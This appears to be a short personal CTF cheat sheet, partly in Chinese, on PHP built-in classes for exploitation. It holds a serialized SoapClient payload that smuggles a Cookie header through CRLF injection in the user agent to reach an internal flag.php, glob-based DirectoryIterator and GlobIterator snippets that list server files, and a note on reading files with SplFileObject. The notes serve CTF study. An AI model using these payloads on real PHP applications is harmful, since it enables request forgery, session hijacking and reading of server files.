- # SoapClient
- ```php
  <?php
  $a = new SoapClient(
    null,
    array(
        'uri'=>'bbb',
        'location'=>'http://127.0.0.1:81/flag.php',
        'user_agent'=>"test\r\nCookie: PHPSESSID=0mrbj32r0ptfcnf7l6kmmgh1c4"
    )
  );
  echo urlencode(serialize($a));
  # 利用: $a->notexist();
  ?>
  ```
- # Error类:
	- ((62efc5c6-a0d5-4eab-906e-0db03366b1e9))
- # DirectoryIterator
  id:: 6478aaed-922b-471c-b8d6-ec1b0cb0444d
	- ```php
	  $a=new DirectoryIterator("glob:///*");
	  foreach($a as $f){
	  	echo $f.' ';
	  }
	  ```
	- FilesystemIterator与之类似
- # GlobIterator
	- ```php
	  <?php
	  highlight_file(__file__);
	  $dir = '/*';
	  $a = new GlobIterator($dir);
	  foreach($a as $f){
	      echo($f->__toString().'<br>');
	  }
	  ?>
	  ```
- # SplFileObject
	- 可以读取文件，支持伪协议
	- 例子：[[CTF/WP/GDOUCTF 2023 反方向的钟]]